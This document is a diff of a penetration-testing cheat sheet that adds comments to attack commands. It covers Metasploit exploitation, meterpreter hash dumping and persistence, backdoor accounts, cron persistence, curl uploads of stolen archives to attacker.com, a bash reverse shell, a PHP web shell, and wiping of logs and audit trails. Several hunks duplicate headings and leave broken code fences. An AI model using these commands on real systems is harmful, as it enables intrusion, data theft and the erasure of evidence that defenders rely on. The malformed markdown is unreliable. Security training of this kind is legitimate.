+Open the Metasploit interactive console for exploit development and execution.
+```bash
+msfconsole                 # start the Metasploit console
 ```
 Launch Metasploit.
 
 **Search for exploits**
 ```bash
-msf> search type:exploit platform:linux
+**Search for exploits**
+
+Locate exploit modules by type, platform, or keyword.
+```bash
+msf> search type:exploit platform:linux  # search Metasploit for Linux exploits
 ```
 Find exploits in Metasploit.
 
 **Load exploit**
 ```bash
-msf> use exploit/linux/http/openssh_backdoor
+msf> use exploit/linux/http/openssh_backdoor  # load a specific exploit module
 ```
 Select an exploit.
 
 **Show options**
 ```bash
-msf> show options
+msf> show options          # display required exploit settings
 ```
 See required parameters.
 
 **Set target**
 ```bash
-msf> set RHOSTS 192.168.1.5
-msf> set RPORT 22
+msf> set RHOSTS 192.168.1.5  # set the target host
+msf> set RPORT 22            # set the target port
 ```
 Specify target.
 
 **Run exploit**
 ```bash
-msf> run
+msf> run                   # execute the selected exploit
 ```
 Execute the exploit.
 
@@ -864,43 +1095,51 @@ Execute the exploit.
 
 **Get system info**
 ```
-meterpreter> sysinfo
+**Get system info**
+
+Retrieve host details from a meterpreter session.
+```
+meterpreter> sysinfo       # display system information on the target
 ```
 System information.
 
 **Get shell**
 ```
-meterpreter> shell
+**Get shell**
+
+Escalate to an interactive OS shell from meterpreter.
+```
+meterpreter> shell         # drop into a normal command shell
 ```
 Drop to normal shell.
 
 **Upload files**
 ```
-meterpreter> upload /tmp/payload.sh /tmp/
+meterpreter> upload /tmp/payload.sh /tmp/  # upload a file to the target
 ```
 Upload to target.
 
 **Download files**
 ```
-meterpreter> download /etc/passwd /tmp/
+meterpreter> download /etc/passwd /tmp/    # download a file from the target
 ```
 Download from target.
 
 **Dump hashes**
 ```
-meterpreter> hashdump
+meterpreter> hashdump      # dump password hashes from the target
 ```
 Get SAM hashes (Windows).
 
 **Migrate process**
 ```
-meterpreter> migrate explorer.exe
+meterpreter> migrate explorer.exe  # move Meterpreter into another process
 ```
 Move to another process.
 
 **Create persistence**
 ```
-meterpreter> persistence -X -i 10 -p 4444 -r attacker.com
+meterpreter> persistence -X -i 10 -p 4444 -r attacker.com  # create a persistence handler
 ```
 Restart handler on reboot.
 
@@ -912,19 +1151,19 @@ Full team-based attack scenarios.
 
 **Check for web vulnerabilities (manual)**
 ```bash
-curl https://example.com/admin.php
+curl https://example.com/admin.php  # request a specific page to probe for hidden admin content
 ```
 Probe for admin pages.
 
 **Directory brute force**
 ```bash
-dirbuster -u http://example.com -l /usr/share/wordlists/common.txt
+dirbuster -u http://example.com -l /usr/share/wordlists/common.txt  # brute-force directories and files on a web server
 ```
 Find hidden directories.
 
 **SQL Injection test**
 ```bash
-curl "http://example.com/search.php?q=1' OR '1'='1"
+curl "http://example.com/search.php?q=1' OR '1'='1"  # send a basic SQL injection test payload
 ```
 Test for SQL injection.
 
@@ -932,19 +1171,19 @@ Test for SQL injection.
 
 **Check local network**
 ```bash
-arp -a
+arp -a                      # list hosts seen on the local network
 ```
 Find other systems on network.
 
 **Find trusts between systems**
 ```bash
-nltest /domain_trusts
+nltest /domain_trusts       # list Windows domain trusts
 ```
 Windows domain trusts (if on Windows).
 
 **List network services**
 ```bash
-ss -tulnp
+ss -tulnp                   # show listening ports and the processes using them
 ```
 Find listening services.
 
@@ -952,19 +1191,19 @@ Find listening services.
 
 **Add SSH key (stay in system)**
 ```bash
-echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys  # add an SSH key for login access
 ```
 Add SSH key for access.
 
 **Create user account**
 ```bash
-sudo useradd -m -s /bin/bash hacker
+sudo useradd -m -s /bin/bash hacker  # create a new local user account
 ```
 Create backdoor user.
 
 **Setup cron job persistence**
 ```bash
-(crontab -l; echo "* * * * * /tmp/shell.sh") | crontab -
+(crontab -l; echo "* * * * * /tmp/shell.sh") | crontab -  # schedule a job to run every minute
 ```
 Run command every minute.
 
@@ -972,14 +1211,14 @@ Run command every minute.
 
 **Clear bash history**
 ```bash
-history -c
-rm ~/.bash_history
+history -c                  # clear the current shell history
+rm ~/.bash_history          # remove the saved Bash history file
 ```
 Remove command history.
 
 **Clear logs**
 ```bash
-sudo rm /var/log/auth.log
+sudo rm /var/log/auth.log   # delete the authentication log file
 ```
 **These are ONLY for authorized testing!**
  - Get written permission FIRST
@@ -996,26 +1235,38 @@ Gain higher access levels.
 
 **Who am I?**
 ```bash
-whoami
-id
+**Who am I?**
+
+Quickly display the current effective user and group IDs.
+```bash
+whoami                      # print the current username
+id                          # print the current user ID and groups
 ```
 Shows current user and groups.
 
 **Can I run sudo?**
 ```bash
-sudo -l
+**Can I run sudo?**
+
+List which commands the current user may run with sudo.
+```bash
+sudo -l                     # list commands allowed by sudo
 ```
 Check sudo permissions.
 
 **Find SUID binaries**
 ```bash
-find / -perm -4000 2>/dev/null
+**Find SUID binaries**
+
+Search for setuid-root files that may allow privilege escalation.
+```bash
+find / -perm -4000 2>/dev/null  # find SUID binaries on the system
 ```
 Find programs running as root.
 
 **Check kernel version**
 ```bash
-uname -a
+uname -a                    # show the kernel and system version
 ```
 Old kernels have exploits.
 
@@ -1023,33 +1274,33 @@ Old kernels have exploits.
 
 **Use sudo without password**
 ```bash
-sudo bash
+sudo bash                   # start a root shell if sudo is allowed
 ```
 Execute command as root (if allowed).
 
 **Exploit weak sudo permissions**
 ```bash
-sudo /usr/bin/nano
+sudo /usr/bin/nano          # run nano with elevated privileges
 ```
 If you can run editor as sudo, type shell commands.
 
 **Find password in files**
 ```bash
-find / -type f -name "*.txt" -o -name "*.conf" 2>/dev/null | xargs grep -l password
+find / -type f -name "*.txt" -o -name "*.conf" 2>/dev/null | xargs grep -l password  # search files for hardcoded passwords
 ```
 Search for hardcoded passwords.
 
 **Check cron jobs**
 ```bash
-crontab -l
-cat /etc/cron.d/*
+crontab -l                  # list the current user's scheduled jobs
+cat /etc/cron.d/*           # display system cron jobs
 ```
 Find scripts you can modify.
 
 **Check directory permissions**
 ```bash
-ls -la /opt
-ls -la /tmp
+ls -la /opt                 # list contents and permissions of /opt
+ls -la /tmp                 # list contents and permissions of /tmp
 ```
 Find writable directories.
 
@@ -1064,21 +1315,29 @@ Tactics to compromise humans instead of systems.
 
 **Create phishing email template**
 ```bash
-# Using msfconsole
-msfconsole
-msf> search phishing
-msf> use exploit/windows/fileformat/office_word_hta
+**Create phishing email template**
+
+Use frameworks to craft and deploy phishing templates and payloads.
+```bash
+# Using msfconsole                                  # note that these steps use Metasploit
+msfconsole                                         # start Metasploit for phishing-related modules
+msf> search phishing                               # search Metasploit for phishing modules
+msf> use exploit/windows/fileformat/office_word_hta  # load an Office file-format exploit
 ```
 
 **Check for social media info**
 ```bash
-curl https://api.github.com/users/username
+**Check for social media info**
+
+Query public APIs for user metadata that can aid targeting.
+```bash
+curl https://api.github.com/users/username  # query GitHub user metadata
 ```
 Find GitHub info leakage.
 
 **Email enumeration**
 ```bash
-theHarvester -d example.com -b all
+theHarvester -d example.com -b all  # collect emails and subdomains from many sources
 ```
 Find valid email addresses.
 
@@ -1086,7 +1345,7 @@ Find valid email addresses.
 
 **Create fake login page**
 ```bash
-setoolkit
+setoolkit                  # launch the Social-Engineer Toolkit
 # Choose: Social Engineering Attacks > Website Attack Vectors
 # > Credential Harvester Attack Method
 ```
@@ -1094,7 +1353,7 @@ SET creates fake login pages.
 
 **Payload delivery**
 ```bash
-python -m SimpleHTTPServer 8080
+python -m SimpleHTTPServer 8080  # start a simple HTTP server to host files
 ```
 Host malicious files.
 
@@ -1109,19 +1368,31 @@ Monitor for activity and evidence.
 
 **Watch processes**
 ```bash
-top
+**Watch processes**
+
+Open a live view of running processes and system load.
+```bash
+top                        # show live process activity
 ```
 Live process monitor.
 
 **Watch file access**
 ```bash
-tail -f /var/log/auth.log
+**Watch file access**
+
+Follow log files in real time to observe authentication events.
+```bash
+tail -f /var/log/auth.log  # follow authentication log updates live
 ```
 See login attempts.
 
 **Monitor ports**
 ```bash
-ss -tulnp
+**Monitor ports**
+
+List active listening sockets and the owning processes.
+```bash
+ss -tulnp                  # show listening ports and process names
 ```
 See what's listening.
 
@@ -1129,19 +1400,19 @@ See what's listening.
 
 **View login history**
 ```bash
-last
+last                       # show recent logins and reboots
 ```
 See who logged in.
 
 **Check sudo usage**
 ```bash
-sudo cat /var/log/auth.log | grep sudo
+sudo cat /var/log/auth.log | grep sudo  # search auth logs for sudo usage
 ```
 See sudo commands (if logged in).
 
 **Find recent files**
 ```bash
-find / -type f -newermt "2026-05-20" 2>/dev/null
+find / -type f -newermt "2026-05-20" 2>/dev/null  # find files modified after a given date
 ```
 Find files modified after date.
 
@@ -1149,19 +1420,19 @@ Find files modified after date.
 
 **Capture traffic**
 ```bash
-sudo tcpdump -i eth0 -n
+sudo tcpdump -i eth0 -n    # capture packets on interface eth0 without name resolution
 ```
 Live packet capture.
 
 **Capture to file**
 ```bash
-sudo tcpdump -i eth0 -w capture.pcap
+sudo tcpdump -i eth0 -w capture.pcap  # save captured packets to a file
 ```
 Save traffic for analysis.
 
 **Filter specific traffic**
 ```bash
-sudo tcpdump -i eth0 -n "port 80"
+sudo tcpdump -i eth0 -n "port 80"  # capture only traffic for port 80
 ```
 Capture HTTP only.
 
@@ -1176,21 +1447,33 @@ Methods to steal data from targets.
 
 **Exfiltrate via DNS**
 ```bash
-exfil -f /etc/passwd -d example.com
+**Exfiltrate via DNS**
+
+Send file contents out by encoding data into DNS queries.
+```bash
+exfil -f /etc/passwd -d example.com  # send file data through DNS queries
 ```
 Hide data in DNS queries.
 
 **Compress and upload**
 ```bash
-tar czf sensitive.tar.gz /var/www/html/
-curl -F "file=@sensitive.tar.gz" http://attacker.com/upload.php
+**Compress and upload**
+
+Archive data locally and upload via HTTP for exfiltration.
+```bash
+tar czf sensitive.tar.gz /var/www/html/  # compress a directory into an archive
+curl -F "file=@sensitive.tar.gz" http://attacker.com/upload.php  # upload the archive with multipart form data
 ```
 Compress before exfil.
 
 **Split large files**
 ```bash
-split -b 1M largefile.zip largefile.zip.
-for i in largefile.zip.*; do curl -F "file=@$i" http://attacker.com/upload.php; done
+**Split large files**
+
+Break large archives into chunks for incremental upload.
+```bash
+split -b 1M largefile.zip largefile.zip.  # split a large file into 1 MB chunks
+for i in largefile.zip.*; do curl -F "file=@$i" http://attacker.com/upload.php; done  # upload each chunk one by one
 ```
 Upload in chunks.
 
@@ -1198,15 +1481,15 @@ Upload in chunks.
 
 **Use ICMP for data transfer**
 ```bash
-icmptunnel -s 192.168.1.5
-icmptunnel -c example.com
+icmptunnel -s 192.168.1.5  # start an ICMP tunnel server
+icmptunnel -c example.com   # connect to an ICMP tunnel server
 ```
 Tunnel data through ICMP.
 
 **Use DNS tunneling**
 ```bash
-dnscat2
-dnscat2 -l 127.0.0.1
+dnscat2                     # start the dnscat2 tool
+dnscat2 -l 127.0.0.1        # listen locally for dnscat2 sessions
 ```
 Data exfil via DNS.
 
@@ -1214,14 +1497,14 @@ Data exfil via DNS.
 
 **Dump MySQL database**
 ```bash
-mysqldump -h 192.168.1.5 -u root -p database_name > dump.sql
+mysqldump -h 192.168.1.5 -u root -p database_name > dump.sql  # export a MySQL database to SQL
 ```
 Export full database.
 
 **Large file theft**
 ```bash
-dd if=/dev/sda | gzip > disk_image.gz
-tar czf /var/www/html/index.html > /tmp/archive.tar.gz
+dd if=/dev/sda | gzip > disk_image.gz  # read a disk image and compress it
+tar czf /var/www/html/index.html > /tmp/archive.tar.gz  # create a compressed archive from files
 ```
 Steal entire files/disks.
 
@@ -1236,25 +1519,33 @@ Remove evidence of exploitation.
 
 **Clear system logs**
 ```bash
-rm /var/log/auth.log
-rm /var/log/syslog
-rm /var/log/apache2/access.log
+**Clear system logs**
+
+Delete or truncate common system logs to remove access traces.
+```bash
+rm /var/log/auth.log        # remove the authentication log
+rm /var/log/syslog          # remove the system log
+rm /var/log/apache2/access.log  # remove the Apache access log
 ```
 Remove access evidence.
 
 **Clear command history**
 ```bash
-history -c
-history -w
-cat /dev/null > ~/.bash_history
-rm ~/.bash_history
+**Clear command history**
+
+Remove interactive shell history to obscure commands executed.
+```bash
+history -c                  # clear the current shell history
+history -w                  # write the in-memory history to disk
+cat /dev/null > ~/.bash_history  # truncate the Bash history file
+rm ~/.bash_history          # delete the saved Bash history file
 ```
 Hide commands run.
 
 **Clear shell history**
 ```bash
-ln -sf /dev/null ~/.bash_history
-shred -vfz -n 3 ~/.bash_history
+ln -sf /dev/null ~/.bash_history  # make Bash history point to /dev/null
+shred -vfz -n 3 ~/.bash_history   # securely overwrite the history file
 ```
 Prevent history recovery.
 
@@ -1262,13 +1553,13 @@ Prevent history recovery.
 
 **Change file timestamps**
 ```bash
-touch -acmdt 202601010000 /tmp/shell.sh
+touch -acmdt 202601010000 /tmp/shell.sh  # set access, modify, and change timestamps
 ```
 Change to older date.
 
 **Fabricate false timestamps**
 ```bash
-touch -d "1 month ago" filecopy.php
+touch -d "1 month ago" filecopy.php  # set a file timestamp to an older date
 ```
 Make file look old.
 
@@ -1276,23 +1567,23 @@ Make file look old.
 
 **Clear Linux audit logs**
 ```bash
-auditctl -e 0
-rm /var/log/audit/audit.log
+auditctl -e 0               # disable the audit subsystem
+rm /var/log/audit/audit.log # remove the audit log file
 ```
 Disable and clear auditd.
 
 **Clear firewall logs**
 ```bash
-iptables -Z
-echo > /var/log/ufw.log
+iptables -Z                 # zero firewall packet counters
+echo > /var/log/ufw.log     # empty the UFW log file
 ```
 Clear firewall entries.
 
 **Windows log clearing**
 ```bash
-wevtutil cl Security
-wevtutil cl System
-wevtutil cl Application
+wevtutil cl Security        # clear the Windows Security event log
+wevtutil cl System          # clear the Windows System event log
+wevtutil cl Application     # clear the Windows Application event log
 ```
 Clear Windows Event Logs.
 
@@ -1300,19 +1591,19 @@ Clear Windows Event Logs.
 
 **Delete temp files**
 ```bash
-shred -vfz -n 5 /tmp/*
+shred -vfz -n 5 /tmp/*      # securely delete files in /tmp
 ```
 Secure file deletion.
 
 **Find suspicious files**
 ```bash
-find / -name "^shell*" -o -name "*backdoor*" 2>/dev/null
+find / -name "^shell*" -o -name "*backdoor*" 2>/dev/null  # search for suspicious files by name
 ```
 Locate malicious files.
 
 **Remove backdoor user**
 ```bash
-userdel -r backdoor_account
+userdel -r backdoor_account  # remove a user account and its home directory
 ```
 Remove created users.
 
@@ -1324,20 +1615,20 @@ Find vulnerabilities for legal financial reward.
 
 **Gather subdomains**
 ```bash
-nslookup -type=A example.com
-dig example.com +short
+nslookup -type=A example.com  # query A records for a domain
+dig example.com +short        # print only the short DNS answer
 ```
 Find all subdomains.
 
 **Check wayback machine**
 ```bash
-curl -s "https://archive.org/wayback/available?url=example.com" | grep snapshot
+curl -s "https://archive.org/wayback/available?url=example.com" | grep snapshot  # check the Wayback Machine for archived snapshots
 ```
 Find old versions of site.
 
 **Find endpoints**
 ```bash
-curl -s http://example.com/robots.txt
+curl -s http://example.com/robots.txt  # fetch the site's robots.txt file
 ```
 Check robots.txt for hints.
 
@@ -1345,25 +1636,25 @@ Check robots.txt for hints.
 
 **Test for XSS**
 ```bash
-curl "http://example.com/search?q=<script>alert(1)</script>"
+curl "http://example.com/search?q=<script>alert(1)</script>"  # test for reflected XSS
 ```
 Test reflected XSS.
 
 **Test SSRF**
 ```bash
-curl "http://example.com/image?url=http://127.0.0.1:8080"
+curl "http://example.com/image?url=http://127.0.0.1:8080"  # test for SSRF against localhost
 ```
 Try local address access.
 
 **Check headers**
 ```bash
-curl -v http://example.com 2>&1 | grep -i security
+curl -v http://example.com 2>&1 | grep -i security  # look for security-related response headers
 ```
 Find missing security headers.
 
 **Subdomain takeover check**
 ```bash
-nslookup sub.example.com
+nslookup sub.example.com    # check whether a subdomain resolves
 ```
 Check if subdomain resolves.
 
@@ -1371,13 +1662,13 @@ Check if subdomain resolves.
 
 **Enumerate API endpoints**
 ```bash
-curl -s http://example.com/api/
+curl -s http://example.com/api/  # fetch the API base endpoint
 ```
 Find API base.
 
 **Test parameter manipulation**
 ```bash
-curl "http://example.com/api/user/1" -H "Authorization: Bearer token"
+curl "http://example.com/api/user/1" -H "Authorization: Bearer token"  # test API access with an authorization header
 ```
 Test API authentication.
 
@@ -1385,7 +1676,7 @@ Test API authentication.
 
 **Screenshot for POC**
 ```bash
-curl -s http://example.com | head
+curl -s http://example.com | head  # capture the first lines of a vulnerable response
 ```
 Capture vulnerable response.
 
@@ -1400,19 +1691,19 @@ Safe communication for red team.
 
 **Create encrypted file**
 ```bash
-gpg -c secret.txt
+gpg -c secret.txt  # encrypt a file with a password
 ```
 Encrypt with password.
 
 **Decrypt file**
 ```bash
-gpg secret.txt.gpg
+gpg secret.txt.gpg  # decrypt a GPG-encrypted file
 ```
 Decrypt file.
 
 **SSH with key**
 ```bash
-ssh -i private_key.pem user@example.com
+ssh -i private_key.pem user@example.com  # connect to a server using an SSH private key
 ```
 Use SSH key instead of password.
 
@@ -1420,7 +1711,7 @@ Use SSH key instead of password.
 
 **SSH tunnel through firewall**
 ```bash
-ssh -L 8080:internal.service:80 user@jumphost
+ssh -L 8080:internal.service:80 user@jumphost  # forward a local port to an internal service
 ```
 Forward local port to internal service.
 
@@ -1474,50 +1765,50 @@ Forward local port to internal service.
 | Purpose | Command |
 | --- | --- |
 | **OSINT** | |
-| Email harvesting | `theHarvester -d example.com -b all` |
-| Metadata extraction | `exiftool document.pdf` |
-| Shodan search | `shodan host 1.2.3.4` |
+| Email harvesting | `theHarvester -d example.com -b all` |  # collect emails and subdomains from many sources
+| Metadata extraction | `exiftool document.pdf` |  # extract file metadata
+| Shodan search | `shodan host 1.2.3.4` |  # show Shodan details for a host
 | **Scanning** | |
-| Port scan | `nmap -p- example.com` |
-| Service detection | `nmap -sV example.com` |
-| Stealth scan | `nmap -sS example.com` |
-| Web scanner | `nikto -h http://example.com` |
+| Port scan | `nmap -p- example.com` |  # scan all TCP ports
+| Service detection | `nmap -sV example.com` |  # detect service versions
+| Stealth scan | `nmap -sS example.com` |  # run a SYN scan
+| Web scanner | `nikto -h http://example.com` |  # scan a web server for common issues
 | **Web Apps** | |
-| SQL injection | `sqlmap -u "url" --dbs` |
-| Directory brute force | `dirbuster -u http://example.com -l wordlist.txt` |
-| Burp proxy | `curl -x http://127.0.0.1:8080 http://target` |
+| SQL injection | `sqlmap -u "url" --dbs` |  # test for SQL injection and list databases
+| Directory brute force | `dirbuster -u http://example.com -l wordlist.txt` |  # brute-force hidden directories
+| Burp proxy | `curl -x http://127.0.0.1:8080 http://target` |  # send traffic through Burp
 | **Databases** | |
-| MySQL connect | `mysql -h 1.2.3.4 -u root -p` |
-| PostgreSQL enum | `psql -h 1.2.3.4 -U postgres -c "SHOW DATABASES;"` |
-| MongoDB dump | `mongo 1.2.3.4:27017 --eval "db.collection_name.find().pretty()"` |
+| MySQL connect | `mysql -h 1.2.3.4 -u root -p` |  # connect to MySQL
+| PostgreSQL enum | `psql -h 1.2.3.4 -U postgres -c "SHOW DATABASES;"` |  # list PostgreSQL databases
+| MongoDB dump | `mongo 1.2.3.4:27017 --eval "db.collection_name.find().pretty()"` |  # print a MongoDB collection
 | **Exploitation** | |
-| Brute force | `hydra -l user -P wordlist.txt ssh://target` |
-| Hash crack | `hashcat -m 1000 hashes.txt rockyou.txt` |
-| Reverse shell | `bash -i >& /dev/tcp/attacker/4444 0>&1` |
-| Web shell | `<?php system($_GET['cmd']); ?>` |
-| SSH tunnel | `ssh -L 8080:internal:80 user@jumphost` |
+| Brute force | `hydra -l user -P wordlist.txt ssh://target` |  # brute-force SSH credentials
+| Hash crack | `hashcat -m 1000 hashes.txt rockyou.txt` |  # crack NTLM hashes with a wordlist
+| Reverse shell | `bash -i >& /dev/tcp/attacker/4444 0>&1` |  # open a Bash reverse shell
+| Web shell | `<?php system($_GET['cmd']); ?>` |  # execute commands through a PHP web shell
+| SSH tunnel | `ssh -L 8080:internal:80 user@jumphost` |  # forward a local port through SSH
 | **Metasploit** | |
-| Start MSF | `msfconsole` |
-| Search exploit | `msf> search type:exploit` |
-| Run exploit | `msf> run` |
-| Meterpreter | `meterpreter> hashdump` |
+| Start MSF | `msfconsole` |  # start Metasploit
+| Search exploit | `msf> search type:exploit` |  # search for exploit modules
+| Run exploit | `msf> run` |  # execute the selected module
+| Meterpreter | `meterpreter> hashdump` |  # dump password hashes
 | **Privilege Escalation** | |
-| Check sudo | `sudo -l` |
-| Find SUID | `find / -perm -4000 2>/dev/null` |
-| Kernel exploit | `uname -a` (find CVE) |
+| Check sudo | `sudo -l` |  # list sudo permissions
+| Find SUID | `find / -perm -4000 2>/dev/null` |  # find SUID binaries
+| Kernel exploit | `uname -a` (find CVE) |  # check the kernel version for known CVEs
 | **Exfiltration** | |
-| Copy file | `scp file user@target:/tmp/` |
-| Compress | `tar czf data.tar.gz /var/www/` |
-| DNS exfil | `dnscat2 -c attacker.com` |
+| Copy file | `scp file user@target:/tmp/` |  # copy a file to a remote host
+| Compress | `tar czf data.tar.gz /var/www/` |  # compress a directory into an archive
+| DNS exfil | `dnscat2 -c attacker.com` |  # tunnel data over DNS
 | **Anti-Forensics** | |
-| Clear history | `history -c; rm ~/.bash_history` |
-| Change timestamp | `touch -acmdt 202601010000 file.php` |
-| Secure delete | `shred -vfz -n 5 /tmp/shell.sh` |
+| Clear history | `history -c; rm ~/.bash_history` |  # clear shell history
+| Change timestamp | `touch -acmdt 202601010000 file.php` |  # set custom file timestamps
+| Secure delete | `shred -vfz -n 5 /tmp/shell.sh` |  # securely overwrite a file
 | **Monitoring** | |
-| Watch logs | `tail -f /var/log/auth.log` |
-| Capture packets | `tcpdump -i eth0 -n` |
-| Active processes | `ps aux` |
-| Network connections | `ss -tulnp` |
+| Watch logs | `tail -f /var/log/auth.log` |  # follow authentication logs live
+| Capture packets | `tcpdump -i eth0 -n` |  # capture packets without name resolution
+| Active processes | `ps aux` |  # list running processes
+| Network connections | `ss -tulnp` |  # show listening sockets and processes
 
 ---
 
@@ -1546,7 +1837,7 @@ Located in `/usr/share/wordlists/`:
 
 ### Download Custom Wordlists
 ```bash
-wget https://github.com/danielmiessler/SecLists/archive/master.zip
+wget https://github.com/danielmiessler/SecLists/archive/master.zip  # download the SecLists archive
 ```
 SecLists - huge collection for fuzzing
 
